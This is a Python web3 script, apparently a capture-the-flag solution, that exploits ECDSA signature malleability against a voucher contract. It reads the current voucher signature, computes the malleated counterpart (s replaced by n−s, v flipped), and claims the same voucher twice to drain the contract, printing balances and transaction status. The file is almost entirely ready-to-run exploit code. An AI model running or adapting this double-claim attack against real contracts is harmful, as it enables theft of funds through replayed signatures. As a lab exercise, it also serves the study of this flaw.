from web3 import Web3

RPC = "https://rpc-01kyyrgd1ewfn7x6s7rkaxfy6r.u-ctf-ctf-7001b39a.urc.tf/"
PLAYER = Web3.to_checksum_address("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
TARGET = Web3.to_checksum_address("0x62c470bBB019F9e9B33E2D3594879F599FaE91C9")

SECP256K1_N = int(
    "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 16
)

ABI = [
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "currentVoucher",
        "outputs": [
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
            {"internalType": "uint256", "name": "nonce", "type": "uint256"},
            {"internalType": "bytes", "name": "signature", "type": "bytes"},
        ],
        "stateMutability": "pure",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
            {"internalType": "uint256", "name": "nonce", "type": "uint256"},
            {"internalType": "bytes", "name": "signature", "type": "bytes"},
        ],
        "name": "claim",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "bytes32", "name": "", "type": "bytes32"}],
        "name": "redeemed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

def malleate_signature(sig: bytes) -> bytes:
    assert len(sig) == 65

    r = sig[:32]
    s = int.from_bytes(sig[32:64], "big")
    v = sig[64]

    if v in (0, 1):
        v2 = 1 - v
    elif v in (27, 28):
        v2 = 55 - v
    else:
        raise ValueError(f"unexpected v: {v}")

    s2 = SECP256K1_N - s
    return r + s2.to_bytes(32, "big") + bytes([v2])


w3 = Web3(Web3.HTTPProvider(RPC))
c = w3.eth.contract(address=TARGET, abi=ABI)

amount, nonce, sig = c.functions.currentVoucher().call()
sig = bytes(sig)
sig2 = malleate_signature(sig)

print("[*] chain id         :", w3.eth.chain_id)
print("[*] player           :", PLAYER)
print("[*] target           :", TARGET)
print("[*] player balance   :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] contract balance :", w3.from_wei(w3.eth.get_balance(TARGET), "ether"), "ETH")
print("[*] solved before    :", c.functions.isSolved().call())
print("[*] amount           :", amount, "=", w3.from_wei(amount, "ether"), "ETH")
print("[*] nonce            :", nonce)
print("[*] original sig     :", sig.hex())
print("[*] malleated sig    :", sig2.hex())

ticket1 = w3.keccak(sig)
ticket2 = w3.keccak(sig2)

print("[*] redeemed original:", c.functions.redeemed(ticket1).call())
print("[*] redeemed malleate:", c.functions.redeemed(ticket2).call())

# Kalau voucher asli belum pernah diklaim, klaim dulu.
if not c.functions.redeemed(ticket1).call():
    print("[*] claiming original voucher...")
    tx = c.functions.claim(amount, nonce, sig).transact({
        "from": PLAYER,
        "gas": 300000,
    })
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print("[+] original tx      :", receipt.transactionHash.hex())
    print("[+] status           :", receipt.status)

# Klaim kedua pakai signature malleated.
if not c.functions.redeemed(ticket2).call() and w3.eth.get_balance(TARGET) > 0:
    print("[*] claiming malleated voucher...")
    tx = c.functions.claim(amount, nonce, sig2).transact({
        "from": PLAYER,
        "gas": 300000,
    })
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print("[+] malleated tx     :", receipt.transactionHash.hex())
    print("[+] status           :", receipt.status)

print("[*] player balance   :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] contract balance :", w3.from_wei(w3.eth.get_balance(TARGET), "ether"), "ETH")
print("[*] solved after     :", c.functions.isSolved().call())
